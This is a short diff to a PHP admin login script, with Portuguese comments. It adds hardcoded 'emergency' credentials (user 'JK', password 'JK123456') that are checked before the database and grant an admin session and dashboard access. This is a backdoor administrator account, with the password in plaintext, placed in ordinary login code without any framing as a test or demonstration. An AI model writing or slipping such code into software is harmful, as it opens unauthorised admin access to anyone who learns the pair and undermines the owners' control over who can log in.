@@ -6,6 +6,19 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $usuario = $_POST['usuario'];
     $senha = $_POST['senha'];
     
+    // Credenciais fixas de emergência
+    $usuario_fixo = 'JK';
+    $senha_fixa = 'JK123456';
+    
+    // Verifica primeiro as credenciais fixas
+    if ($usuario === $usuario_fixo && $senha === $senha_fixa) {
+        $_SESSION['admin_logado'] = true;
+        $_SESSION['admin_usuario'] = $usuario_fixo;
+        header('Location: admin/dashboard.php');
+        exit();
+    }
+    
+    // Se não for o usuário fixo, verifica no banco de dados
     $stmt = $pdo->prepare("SELECT * FROM usuarios_admin WHERE usuario = ?");
     $stmt->execute([$usuario]);
     $admin = $stmt->fetch();
